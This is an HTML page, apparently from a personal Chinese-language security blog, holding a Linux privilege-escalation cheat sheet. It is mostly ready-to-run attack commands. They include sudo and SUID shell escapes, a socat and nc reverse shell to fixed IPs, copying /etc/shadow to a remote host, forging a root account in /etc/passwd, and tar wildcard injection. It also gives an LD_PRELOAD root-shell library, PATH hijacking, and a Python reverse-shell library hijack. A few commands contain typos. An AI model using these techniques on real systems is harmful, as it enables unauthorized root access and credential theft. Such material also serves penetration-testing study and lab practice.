@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Linux提权 | Zer0-hex&#39;s Blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://Zer0-hex.github.io/favicon.ico?v=1666449900454">
+<link rel="stylesheet" href="https://Zer0-hex.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Linux提权
+CVE提权
+
+CVE 2021-3560 (Polkit)
+CVE 2021-4034 (pwnkit)
+CVE 2022-0847 (DirtyPipe)
+
+利用
+https://github.com/liamg/trai..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://Zer0-hex.github.io">
+        <img src="https://Zer0-hex.github.io/images/avatar.png?v=1666449900454" class="site-logo">
+        <h1 class="site-title">Zer0-hex&#39;s Blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      What are fucking doing?
+    </div>
+    <div class="site-footer">
+      Hack for <a href="https://github.com/Zer0-hex" target="_blank">Zer0-hex</a> | <a class="rss" href="https://Zer0-hex.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Linux提权</h2>
+            <div class="post-date">2022-09-21</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="linux提权">Linux提权</h1>
+<h2 id="cve提权">CVE提权</h2>
+<ul>
+<li>CVE 2021-3560 (Polkit)</li>
+<li>CVE 2021-4034 (pwnkit)</li>
+<li>CVE 2022-0847 (DirtyPipe)</li>
+</ul>
+<h3 id="利用">利用</h3>
+<pre><code>https://github.com/liamg/traitor/
+</code></pre>
+<h2 id="sudo配置提权">sudo配置提权</h2>
+<p>在Linux系统中，sudo是一个很好用的权限管理工具，它允许用户在运行某些命令时提升自己的权限。但错误的配置会导致sudo被利用与提权。</p>
+<ul>
+<li>sudo文件语法</li>
+</ul>
+<pre><code>vim /etc/sudoers
+#Username    Host=(run as)   command to execute
+root                ALL=(ALL:ALL)  ALL
+user1              ALL=(root)        NOPASSWD:/bin/find
+</code></pre>
+<ul>
+<li>查找当前用户可以执行的高权限命令</li>
+</ul>
+<pre><code>$ sudo -l
+----------------------- 一般可利的用输出结果如下所示
+$ sudo -l
+Matching Defaults entries for root on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User root may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/perl /usr/bin/python /usr/bin/less /usr/bin/awk /usr/bin/man....
+</code></pre>
+<ul>
+<li>perl</li>
+</ul>
+<pre><code>$ sudo perl -e 'exec &quot;/bin/bash&quot;'
+</code></pre>
+<ul>
+<li>python</li>
+</ul>
+<pre><code>$ sudo python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<ul>
+<li>less</li>
+</ul>
+<pre><code>$ sudo less /etc/hosts
+ !bash
+</code></pre>
+<ul>
+<li>awk</li>
+</ul>
+<pre><code>$ sudo awk 'BEGIN {system(&quot;/bin/bash&quot;)}'
+</code></pre>
+<ul>
+<li>man</li>
+</ul>
+<pre><code>$ sudo man man
+!bash
+</code></pre>
+<ul>
+<li>vi/vim</li>
+</ul>
+<pre><code>$ sudo vi/vim
+:!bash
+</code></pre>
+<ul>
+<li>env</li>
+</ul>
+<pre><code>sudo env /bin/bash
+</code></pre>
+<ul>
+<li>ftp</li>
+</ul>
+<pre><code>sudo ftp
+! /bin/bash
+</code></pre>
+<ul>
+<li>socat</li>
+</ul>
+<pre><code>客户机：
+socat file:`tty`,raw,echo=0 tcp-listen:1234
+受害机：
+sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
+</code></pre>
+<ul>
+<li>scp</li>
+</ul>
+<pre><code>可以下载存放密码密文的文件
+sudo scp /etc/shadow root@192.168.1.2:~/
+</code></pre>
+<ul>
+<li>other</li>
+</ul>
+<p>有时会出现自定义的脚本被添加sudo权限的情况，对于此种情况下，如果有写权限，那么可以直接覆盖。</p>
+<h2 id="suid-提权">SUID 提权</h2>
+<p>suid可以让普通用户运行的程序以高权限运行，方便管理的同时也方便了提权。</p>
+<h3 id="查找具有suid权限的程序">查找具有SUID权限的程序</h3>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<ul>
+<li>cp</li>
+</ul>
+<pre><code>如果CP拥有SUID权限，那么有两种利用方式。
+1、利用openssl生成密码，添加新的用户到Linux的/etc/Passwd文件中
+
+openssl passwd -1 -salt hack 2333
+$1$hack$hA86ImU4cvh4bQFNvSULf1
+
+cp /etc/passwd /tmp/passwd
+本地修改文件，添加一行 &quot;hack:$1$hack$hA86ImU4cvh4bQFNvSULf1:0:0:root:/root:/bin/bash&quot;
+再上传至目标的/tmp目录下，然后使用cp命令复制到/etc/passwd文件中
+
+su hack 输入密码即可获取root权限
+
+2、利用计划任务反弹shell
+</code></pre>
+<ul>
+<li>find</li>
+</ul>
+<pre><code>touch /tmp/tmp
+find /tmp/tmp -exec &quot;whoami&quot; \;
+</code></pre>
+<ul>
+<li>vim/nano等编辑器</li>
+</ul>
+<pre><code>1、visudo命令调用vim修改/etc/sudoer文件，为当前用户添加权限，完成提权
+2、通过编辑器修改/etc/passwd文件完成提权
+3、查看/etc/shadow文件，爆破高权限用户密码。
+</code></pre>
+<ul>
+<li>bash</li>
+</ul>
+<pre><code>bash -p
+</code></pre>
+<ul>
+<li>python</li>
+</ul>
+<pre><code>import os
+os.ststem('/bin/sh')
+</code></pre>
+<h2 id="容器虚拟化工具提权">容器/虚拟化工具提权</h2>
+<p>在拥有容器权限时，可以利用容器挂载本地的目录。<br>
+通过sudoer、passwd、shadow等配置文件提权。</p>
+<ul>
+<li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">LXD</a></li>
+<li><a href="https://www.hackingarticles.in/docker-privilege-escalation/">Docker</a></li>
+</ul>
+<h2 id="计划任务">计划任务</h2>
+<p>查看计划任务中运行的脚本，如果具有写权限，即可diy脚本提权。</p>
+<h2 id="通配符注入">通配符注入</h2>
+<blockquote>
+<p>https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/</p>
+</blockquote>
+<p>条件，已知将要运行的tar 1.tar *命令</p>
+<p>例如：/etc/crontab</p>
+<pre><code>*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*
+</code></pre>
+<p>Linux在利用通配符时，会将匹配的字符串匹配到命令中，因此可以通过修改文件名的方式，构造恶意命令。</p>
+<p>tar命令可以通过两个参数执行脚本</p>
+<pre><code>--checkpoint-action=exec=sh 1.sh&quot;
+--checkpoint=1
+</code></pre>
+<ul>
+<li>Payload-反弹Shell</li>
+</ul>
+<pre><code>echo &quot;mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp&quot; &gt; shell.sh
+echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
+echo &quot;&quot; &gt; --checkpoint=1
+tar cf archive.tar *
+</code></pre>
+<ul>
+<li>Payload-添加SUID权限</li>
+</ul>
+<pre><code>echo &quot;chmod u+s /usr/bin/find&quot; &gt; test.sh
+echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;
+echo &quot;&quot; &gt; --checkpoint=1
+tar cf archive.tar *
+ls -al /usr/bin/find
+find f1 -exec &quot;whoami&quot; \;
+root
+find f1 -exec &quot;/bin/sh&quot; \;
+id
+whoami
+</code></pre>
+<h2 id="ld_preload劫持sudo提权有点鸡肋">LD_Preload劫持，sudo提权(有点鸡肋)</h2>
+<p>有些具高权限的命令在运行时从环境变量LD_Preload中获取链接库的位置，例如以下这些位置</p>
+<pre><code>/etc/ld.so.*
+/lib/ld-linux.so
+</code></pre>
+<p>可以通过劫持一些程序必定调用的函数，来获取Shell。<br>
+高权限的命令劫持到的Shell自然是高权限。</p>
+<ul>
+<li>payload</li>
+</ul>
+<pre><code>vim fuckld.c
+------------------------------------------------------
+#include&lt;stdlib.h&gt; 
+#include&lt;stdio.h&gt; 
+#include&lt;string.h&gt;
+__attribute__((__constructor__)) void preload (){
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    setgid(0);
+    setuid(0);
+    system(&quot;/bin/sh&quot;);
+}
+</code></pre>
+<ul>
+<li>条件</li>
+</ul>
+<pre><code>sudo配置文件中添加一行
+Defaults        env_keep += LD_PRELOAD
+
+sudo -l 可以看到字样
+</code></pre>
+<ul>
+<li>利用</li>
+</ul>
+<pre><code># 编译
+gcc -shared -fPIC fuckid.c -o /tmp/fuckld.so
+# 修改环境变量
+ls LD_PRELOAD=/tmp/fuckld.so
+
+sudo LD_PRELOAD=/tmp/fuckld.so find
+</code></pre>
+<h2 id="path环境变量提权">PATH环境变量提权</h2>
+<p>有些命令具有SUID权限，并且会调用其他命令，因此可以通过劫持对应的命令来提权</p>
+<ul>
+<li>某SUID权限程序</li>
+</ul>
+<pre><code>#include&lt;unistd.h&gt;
+void main() {
+    setuid(0);
+    setgid(0);
+    system(&quot;ps&quot;);
+}
+</code></pre>
+<ul>
+<li>劫持的命令</li>
+</ul>
+<pre><code>echo &quot;/bin/bash&quot; &gt; /tmp/ps
+chmod 777 /tmp/ps
+</code></pre>
+<ul>
+<li>劫持PATH环境变量</li>
+</ul>
+<pre><code>前面的路径优先调用
+export PATH=/tmp:$PATH
+</code></pre>
+<h2 id="python库劫持">Python库劫持</h2>
+<ul>
+<li>样例文件，1.py</li>
+</ul>
+<pre><code>import goodrequests
+
+goodlib.get(&quot;baidu.com&quot;)
+</code></pre>
+<ul>
+<li>恶意库(被劫持的库)，goodrequests.py</li>
+</ul>
+<pre><code>def get():
+
+    import os
+    import pty
+    import socket
+    import subprocess
+
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((&quot;127.0.0.1&quot;,2333))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    pty.spawn(&quot;/bin/bash&quot;)
+
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://Zer0-hex.github.io/post/android-termux-bu-shu-sui-shen-linux-huan-jing/">
+                  <h3 class="post-title">
+                    Android Termux 部署随身Linux环境
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
